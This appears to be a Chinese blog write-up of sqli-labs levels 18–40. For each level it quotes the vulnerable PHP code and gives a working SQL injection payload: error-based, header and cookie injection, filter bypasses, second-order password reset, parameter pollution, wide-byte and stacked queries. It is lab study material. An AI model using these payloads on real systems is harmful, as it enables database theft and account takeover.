<h1 id="less18"><a href="#less18" class="headerlink" title="less18"></a>less18</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$uname</span> = check_input(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]);</span><br><span class="line"><span class="variable">$passwd</span> = check_input(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]);</span><br><span class="line">这次给账号密码都弄上了过滤函数。</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">但是在下面的代码中insert了我们的uagent ip 和username</span><br><span class="line"><span class="variable">$uagent</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line"><span class="variable">$IP</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"><span class="variable">$insert</span>=<span class="string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;<span class="subst">$uagent</span>&#x27;, &#x27;<span class="subst">$IP</span>&#x27;, <span class="subst">$uname</span>)&quot;</span>;</span><br><span class="line">mysql_query(<span class="variable">$insert</span>);</span><br><span class="line">所以我们这里可以使用报错注入。</span><br></pre></td></tr></table></figure>

<p>由于我们之前前面那些关卡就获得了账号密码了，就不需要在账号密码上下功夫了。insert注意参数数量要一样，3个。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-Agent: 1&#x27;,2,(extractvalue(1,concat(0x5c,database(),0x5c)))) #</span><br></pre></td></tr></table></figure>

<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907152538501.png" alt="image-20220907152538501"></p>
<h1 id="less19"><a href="#less19" class="headerlink" title="less19"></a>less19</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$uagent</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>];</span><br><span class="line"><span class="variable">$IP</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"><span class="variable">$insert</span>=<span class="string">&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#x27;<span class="subst">$uagent</span>&#x27;, &#x27;<span class="subst">$IP</span>&#x27;)&quot;</span>;</span><br><span class="line">mysql_query(<span class="variable">$insert</span>);</span><br></pre></td></tr></table></figure>

<p>这次是referer注入</p>
<p>同样的还是使用报错注入，因为下面有报错语句。注意这次的参数只有两个。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Referer: 1&#x27;,(extractvalue(1,concat(0x5c,database(),0x5c)))) #</span><br></pre></td></tr></table></figure>

<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907152850658.png" alt="image-20220907152850658"></p>
<h1 id="less20"><a href="#less20" class="headerlink" title="less20"></a>less20</h1><p>一个cookie注入</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$cookee</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;uname&#x27;</span>]</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$cookee</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>也就是在cookie中的uname来注入</p>
<p>同样有报错语句，试一下报错注入。</p>
<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907153949462.png" alt="image-20220907153949462"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=admin&#x27;) union select (extractvalue(1,concat(0x5c,database(),0x5c))),2,3 --+</span><br></pre></td></tr></table></figure>

<h1 id="less21"><a href="#less21" class="headerlink" title="less21"></a>less21</h1><p>解密base64闭合单引号括号的cookie注入</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">setcookie(<span class="string">&#x27;uname&#x27;</span>, base64_encode(<span class="variable">$row1</span>[<span class="string">&#x27;username&#x27;</span>]), time()+<span class="number">3600</span>);	</span><br><span class="line"><span class="variable">$cookee</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;uname&#x27;</span>];</span><br><span class="line"><span class="variable">$cookee</span> = base64_decode(<span class="variable">$cookee</span>);</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE username=(&#x27;<span class="subst">$cookee</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>我们就besa64编码一下，然后看到有报错代码，同样使用报错注入。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=admin&#x27;) union select (extractvalue(1,concat(0x5c,database(),0x5c))),2,3 #</span><br></pre></td></tr></table></figure>

<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907155042842.png" alt="image-20220907155042842"></p>
<h1 id="less22"><a href="#less22" class="headerlink" title="less22"></a>less22</h1><p>解密需要闭合双引号的cookie报错注入</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$cookee</span> = base64_decode(<span class="variable">$cookee</span>);</span><br><span class="line">setcookie(<span class="string">&#x27;uname&#x27;</span>, base64_encode(<span class="variable">$row1</span>[<span class="string">&#x27;username&#x27;</span>]), time()+<span class="number">3600</span>);	</span><br><span class="line"><span class="variable">$cookee1</span> = <span class="string">&#x27;&quot;&#x27;</span>. <span class="variable">$cookee</span>. <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE username=<span class="subst">$cookee1</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907155623937.png" alt="image-20220907155623937"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&quot; union select (extractvalue(1,concat(0x5c,database(),0x5c))),2 #</span><br></pre></td></tr></table></figure>

<h1 id="less23"><a href="#less23" class="headerlink" title="less23"></a>less23</h1><p>这一关不一样了，过滤了我们的注释符号</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$reg</span> = <span class="string">&quot;/#/&quot;</span>;</span><br><span class="line"><span class="variable">$reg1</span> = <span class="string">&quot;/--/&quot;</span>;</span><br><span class="line"><span class="variable">$replace</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$id</span> = preg_replace(<span class="variable">$reg</span>, <span class="variable">$replace</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span> = preg_replace(<span class="variable">$reg1</span>, <span class="variable">$replace</span>, <span class="variable">$id</span>);</span><br></pre></td></tr></table></figure>

<p>但是我们可以使用union联合注入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; or &#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line">?id=-1&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),3 or &#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line">?id=-1&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),3 &#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907161043069.png" alt="image-20220907161043069"></p>
<p>其中的group_concat用于连接表名字段</p>
<h1 id="less24-二次注入"><a href="#less24-二次注入" class="headerlink" title="less24-二次注入"></a>less24-二次注入</h1><p>这是一个二次注入，如下，在注册的时候是对所有参数进行了转义的，但是存入数据库的时候是没有进行转义的，而且在最后更新密码的地方是没有对参数进行转义的，所以造成了二次注入。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">创建账号的地方</span><br><span class="line"><span class="variable">$username</span>=  mysql_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) ;</span><br><span class="line"><span class="variable">$pass</span>= mysql_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"><span class="variable">$re_pass</span>= mysql_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;re_password&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">更新密码的地方</span><br><span class="line"><span class="variable">$username</span>= <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line"><span class="variable">$curr_pass</span>= mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;current_password&#x27;</span>]);</span><br><span class="line"><span class="variable">$pass</span>= mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"><span class="variable">$re_pass</span>=mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;re_password&#x27;</span>]);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="subst">$pass</span>&#x27; where username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$curr_pass</span>&#x27; &quot;</span>;</span><br></pre></td></tr></table></figure>

<p>更新密码的地方直接引用了，我们就实现自己账号来改管理员账号</p>
<p><code>admin&#39;#</code></p>
<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907175040985.png" alt="image-20220907175040985"></p>
<p>成功</p>
<h1 id="less25"><a href="#less25" class="headerlink" title="less25"></a>less25</h1><p>这里定义了一个黑名单参数，也就是不能使用or和and了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/AND/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$id</span>= blacklist(<span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>union联合注入不就没有这两个东西嘛</p>
<p><code>-1&#39; union select 1,(select username from users where id=8),3&#39;</code></p>
<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907180600089.png" alt="image-20220907180600089"></p>
<h1 id="less26-过滤空格和特殊字符"><a href="#less26-过滤空格和特殊字符" class="headerlink" title="less26-过滤空格和特殊字符"></a>less26-过滤空格和特殊字符</h1><p>这一关就是特殊符号变多了罢了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/and/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//strip out /*</span></span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out --</span></span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//Strip out #</span></span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[\s]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out spaces</span></span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[\/\\\\]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out slashes</span></span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>双写绕过逻辑运算符或者使用&amp;&amp;和||替换</p>
<p>%09 TAB键（水平）、%0a 新建一行、%0c 新的一页、%0d return功能、%0b TAB键（垂直）、%a0 空格</p>
<p>报错注入空格使用比较少所以我们可以使用报错注入。</p>
<p><code>id=-1&#39;||extractvalue(1,concat(0x5c,database(),0x5c))||&#39;0</code></p>
<p><code>1&#39;||(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&#39;security&#39;))),1))||&#39;0</code></p>
<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907183733394.png" alt="image-20220907183733394"></p>
<h1 id="less27"><a href="#less27" class="headerlink" title="less27"></a>less27</h1><p>黑名单更多了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//strip out /*</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out --.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//Strip out #.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/select/m&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out union</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out select</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/UNION/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out UNION</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/SELECT/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out SELECT</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/Union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out Union</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/Select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out select</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>大小写绕过或者重写绕过</p>
<p>报错也可以</p>
<p><code>?id=-1&#39;||extractvalue(1,concat(0x5c,database(),0x5c))||&#39;0</code></p>
<h1 id="less28"><a href="#less28" class="headerlink" title="less28"></a>less28</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);				<span class="comment">//strip out /*</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);				<span class="comment">//Strip out --.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);					<span class="comment">//Strip out #.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    		<span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="comment">//$id= preg_replace(&#x27;/select/m&#x27;,&quot;&quot;, $id);	   		 	//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    		<span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/union\s+select/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out UNION &amp; SELECT.</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该关卡过滤了注释符空格还过滤了union和select。\s表示空格，+表示匹配一次或多次，/i表示不区分大小写</p>
<p>而且报错语句也被注释掉了！</p>
<p>那就使用重写绕过</p>
<p><code>id=0&#39;)uni union%0Aselecton%0Aselect%0A1,2,group_concat(table_name)from%0Ainformation_schema.tables%0Awhere%0Atable_schema=&#39;security&#39;and (&#39;1</code></p>
<h1 id="less29-参数污染"><a href="#less29-参数污染" class="headerlink" title="less29-参数污染"></a>less29-参数污染</h1><p>index页面存在一个注入</p>
<p><code>-1&#39;||extractvalue(1,concat(0x5c,database(),0x5c))||&#39;0</code></p>
<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907185853625.png" alt="image-20220907185853625"></p>
<p>但是还存在一个登陆界面</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">java_implimentation</span>(<span class="params"><span class="variable">$query_string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$q_s</span> = <span class="variable">$query_string</span>;</span><br><span class="line">	<span class="variable">$qs_array</span>= explode(<span class="string">&quot;&amp;&quot;</span>,<span class="variable">$q_s</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">foreach</span>(<span class="variable">$qs_array</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$val</span>=substr(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">2</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$val</span>==<span class="string">&quot;id&quot;</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable">$id_value</span>=substr(<span class="variable">$value</span>,<span class="number">3</span>,<span class="number">30</span>); </span><br><span class="line">			<span class="keyword">return</span> <span class="variable">$id_value</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">这行代码也就是提取每一个参数名为id的参数，返回一个参数值。我们这里就可以使用参数污染来。</span><br></pre></td></tr></table></figure>

<p>所以我们就用参数污染来就可以了，<code>id=1&amp;id=1&#39; and (extractvalue(1,concat(0x5c,database(),0x5c)))||&#39;0</code></p>
<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907191009511.png" alt="image-20220907191009511"></p>
<h1 id="less30"><a href="#less30" class="headerlink" title="less30"></a>less30</h1><p>一样的，参数污染，只不过需要闭合双引号</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;&quot;&#x27;</span> .<span class="variable">$id</span>. <span class="string">&#x27;&quot;&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p><code>id=1&amp;id=1&quot; and (extractvalue(1,concat(0x5c,database(),0x5c)))||&quot;0</code></p>
<h1 id="less31"><a href="#less31" class="headerlink" title="less31"></a>less31</h1><p>多了个括号，但是貌似对报错注入并不影响</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&amp;id=1&quot; and (extractvalue(1,concat(0x5c,database(),0x5c)))||&quot;0</span><br></pre></td></tr></table></figure>

<h1 id="less32-宽字节注入"><a href="#less32-宽字节注入" class="headerlink" title="less32-宽字节注入"></a>less32-宽字节注入</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span>=check_addslashes(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">mysql_query(<span class="string">&quot;SET NAMES gbk&quot;</span>);</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line">看到这就明白了吧，宽字节注入，编码不同嘛。</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$string</span> = preg_replace(<span class="string">&#x27;/&#x27;</span>. preg_quote(<span class="string">&#x27;\\&#x27;</span>) .<span class="string">&#x27;/&#x27;</span>, <span class="string">&quot;\\\\\\&quot;</span>, <span class="variable">$string</span>);          <span class="comment">//escape any backslash</span></span><br><span class="line">    <span class="variable">$string</span> = preg_replace(<span class="string">&#x27;/\&#x27;/i&#x27;</span>, <span class="string">&#x27;\\\&#x27;&#x27;</span>, <span class="variable">$string</span>);                               <span class="comment">//escape single quote with a backslash</span></span><br><span class="line">    <span class="variable">$string</span> = preg_replace(<span class="string">&#x27;/\&quot;/&#x27;</span>, <span class="string">&quot;\\\&quot;&quot;</span>, <span class="variable">$string</span>);                                <span class="comment">//escape double quote with a backslash</span></span><br><span class="line">      </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>id=-3%20and%20%df%27%20union%20select%201,database(),3%20--+</code></p>
<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907193936122.png" alt="image-20220907193936122"></p>
<h1 id="less33"><a href="#less33" class="headerlink" title="less33"></a>less33</h1><p>和上面一样，只是换了个函数罢了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$string</span>= addslashes(<span class="variable">$string</span>);    </span><br></pre></td></tr></table></figure>

<p><code>id=-3%20and%20%df%27%20union%20select%201,database(),3%20--+</code></p>
<h1 id="less34"><a href="#less34" class="headerlink" title="less34"></a>less34</h1><p>post类型的宽字节注入罢了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$uname1</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>];</span><br><span class="line"><span class="variable">$passwd1</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=&#x27;<span class="subst">$uname</span>&#x27; and password=&#x27;<span class="subst">$passwd</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=mysql_query(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=123&amp;passwd=-123%df&#x27; union select 1,database() --+&amp;submit=Submit</span><br></pre></td></tr></table></figure>

<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907194710480.png" alt="image-20220907194710480"></p>
<h1 id="less35"><a href="#less35" class="headerlink" title="less35"></a>less35</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$string</span> = addslashes(<span class="variable">$string</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=check_addslashes(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">mysql_query(<span class="string">&quot;SET NAMES gbk&quot;</span>);</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br><span class="line">一直这种的宽字节注入有意思吗？笑死没有引号，直接联合注入</span><br></pre></td></tr></table></figure>

<p><code>id=-1 union select 1,2,database()</code></p>
<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907195432350.png" alt="image-20220907195432350"></p>
<h1 id="less36"><a href="#less36" class="headerlink" title="less36"></a>less36</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">一样的</span><br><span class="line"><span class="variable">$string</span>= mysql_real_escape_string(<span class="variable">$string</span>);    </span><br><span class="line">就是换了个函数罢了</span><br></pre></td></tr></table></figure>

<p><code>id=-3%20and%20%df%27%20union%20select%201,database(),3%20--+</code></p>
<h1 id="less37"><a href="#less37" class="headerlink" title="less37"></a>less37</h1><p>36关换成post型了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$uname</span> = mysql_real_escape_string(<span class="variable">$uname1</span>);</span><br><span class="line"><span class="variable">$passwd</span>= mysql_real_escape_string(<span class="variable">$passwd1</span>);</span><br></pre></td></tr></table></figure>

<p><code>uname=admin&amp;passwd=123%df&#39; union select 1,database() --+&amp;submit=Submit</code></p>
<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907200928572.png" alt="image-20220907200928572"></p>
<h1 id="less38"><a href="#less38" class="headerlink" title="less38"></a>less38</h1><p>没理解什么意思，不是直接绕过了吗</p>
<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907201305999.png" alt="image-20220907201305999"></p>
<h1 id="less39"><a href="#less39" class="headerlink" title="less39"></a>less39</h1><p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907201624561.png" alt="image-20220907201624561"></p>
<p>看了大佬的解说，这可以用堆叠注入。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">向表中插入数据</span><br><span class="line">?id=1&#x27;;insert into users(id,username,password) values (&#x27;38&#x27;,&#x27;less38&#x27;,&#x27;hello&#x27;)--+</span><br></pre></td></tr></table></figure>

<h1 id="less40"><a href="#less40" class="headerlink" title="less40"></a>less40</h1><p>一个没有报错的注入，需要闭合单引号和括号</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(&#x27;<span class="subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

